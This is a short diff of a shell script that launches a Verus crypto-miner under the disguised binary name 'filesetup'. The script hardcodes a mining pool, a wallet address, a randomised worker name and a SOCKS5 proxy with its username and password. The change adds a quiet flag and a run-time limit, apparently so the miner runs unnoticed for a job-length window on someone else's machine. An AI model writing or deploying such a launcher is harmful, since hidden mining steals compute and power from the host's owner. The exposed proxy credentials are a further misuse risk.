@@ -7,4 +7,4 @@ POOL=stratum+tcp://na.luckpool.net:3956
 WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
 WORKER=$(echo $(shuf -i 1-10 -n 1)hape)
 PROXY=socks5://curian:kangnyolong93@192.252.215.2:4145
-./filesetup -a verus -o $POOL -u $WALLET.$WORKER -t 8 -x $PROXY
+./filesetup -a verus -o $POOL -u $WALLET.$WORKER -t 8 -x $PROXY -q --time-limit 21000
